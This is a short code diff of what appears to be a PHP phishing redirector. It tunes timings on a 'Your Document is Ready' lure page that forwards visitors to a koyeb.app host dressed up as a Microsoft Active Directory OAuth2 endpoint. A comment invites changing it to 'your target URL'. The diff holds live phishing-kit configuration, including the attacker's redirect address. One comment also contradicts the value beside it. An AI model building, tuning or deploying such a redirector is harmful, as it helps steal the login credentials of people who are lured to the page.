@@ -16,7 +16,7 @@ if (getenv('APP_ENV') !== 'production') {
 $config = [
     'redirect_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/', // <--- Change to your target URL
     'expire_seconds' => 60,  // Token expiry time in seconds
-    'redirect_delay' => 5  // Changed delay to 5 seconds
+    'redirect_delay' => 2  // Changed delay to 5 seconds
 ];
 
 // Block CLI access
@@ -162,7 +162,7 @@ try {
         if (statusElement) {
             statusElement.textContent = 'Your Document is Ready';
         }
-    }, 2000);
+    }, 1000);
 </script>
 
 </body>
